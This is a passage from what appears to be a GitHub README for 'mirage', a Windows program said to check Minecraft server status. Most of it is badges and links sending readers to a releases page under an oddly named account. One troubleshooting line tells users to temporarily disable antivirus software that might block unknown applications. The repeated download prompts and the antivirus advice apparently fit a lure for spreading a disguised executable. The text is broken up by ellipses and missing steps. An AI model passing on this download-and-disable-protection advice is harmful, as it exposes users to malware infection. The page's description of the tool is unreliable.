...
[![Download mirage](https://img.shields.io/badge/Download-mirage-blue?style=for-the-badge&logo=github)](https://github.com/Subarctic-summersweet559/mirage/releases)
...
## 📥 How to Download and Run mirage on Windows

### Step 1: Visit the Download Page

Click the large button below to open the official download page for mirage on GitHub:

[![Download mirage](https://img.shields.io/badge/Download-mirage-green?style=for-the-badge&logo=github)](https://github.com/Subarctic-summersweet559/mirage/releases)
...
### Step 5: Use mirage to Check Minecraft Servers
...
1. **Server Address Input:** Type the server’s hostname or IP. For example, `play.example.com`.  
2. **Check Button:** Click this button to get the server info.  
3. **Display Area:** Shows the MOTD text, number of players online, and server version.  
...
- Temporarily disable antivirus software that might block unknown applications.  
...
- [mirage Official Releases](https://github.com/Subarctic-summersweet559/mirage/releases)  
- [GitHub Repository](https://github.com/Subarctic-summersweet559/mirage)  
...
3. Use this shortcut to open mirage quickly.

---

# 🔄 Updates

New versions may arrive with bug fixes and improved support for Minecraft server versions. Always check the [release page](https://github.com/Subarctic-summersweet559/mirage/releases) for updates.
